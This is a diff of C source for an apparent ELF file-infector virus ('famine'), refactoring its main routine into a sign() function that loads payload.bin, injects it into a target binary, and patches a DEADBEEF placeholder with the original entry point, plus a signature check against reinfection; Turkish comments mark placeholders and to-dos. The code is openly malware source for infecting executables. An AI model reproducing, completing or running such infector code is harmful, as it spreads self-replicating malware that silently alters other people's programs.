@@ -1,6 +1,5 @@
 #include "famine.h"
 
-
 Elf64_Phdr *last_phdr(char *data)
 {
     int         i;
@@ -46,9 +45,9 @@ uint64_t payload(char *data, size_t data_size, char *code, size_t code_size)
     return old_entry;
 }
 
-int is_signed(char *addr, size_t size)
+int is_signed(t_file file)
 {
-    if (memmem(addr, size, SIGNATURE, SIGNATURE_SIZE));
+    if (memmem(file.head, file.size, SIGNATURE, SIGNATURE_SIZE))
         return 1;
     return 0;
 }
@@ -79,20 +78,20 @@ int file_unload(t_file file)
     return 0;
 }
 
-int main(void)
+
+
+int sign(t_file target)
 {
     uint64_t    entry;
     uint64_t    *patch;
-    t_file      target;
     t_file      payload_;
 
-    payload_ = file_load("payload.bin", 0);
-    target = file_load("example", payload_.size);
-
+    payload_ = file_load("payload.bin", 0); // size 0 cunku ekstra istemiyorum, 
+    //target = file_load("example", payload_.size); target payload_.size kadar ustune koymali,  
     entry =  payload(target.head, target.size - payload_.size, payload_.head, payload_.size);
-    patch = memmem(target.head, target.size, "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE", 8);
+    patch = memmem(target.head, target.size, "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE", 8); // yertutucum
     *patch = entry;
-    file_unload(target);
+//    file_unload(target); target unload edilmeli.
     file_unload(payload_);
     return 0;
 }
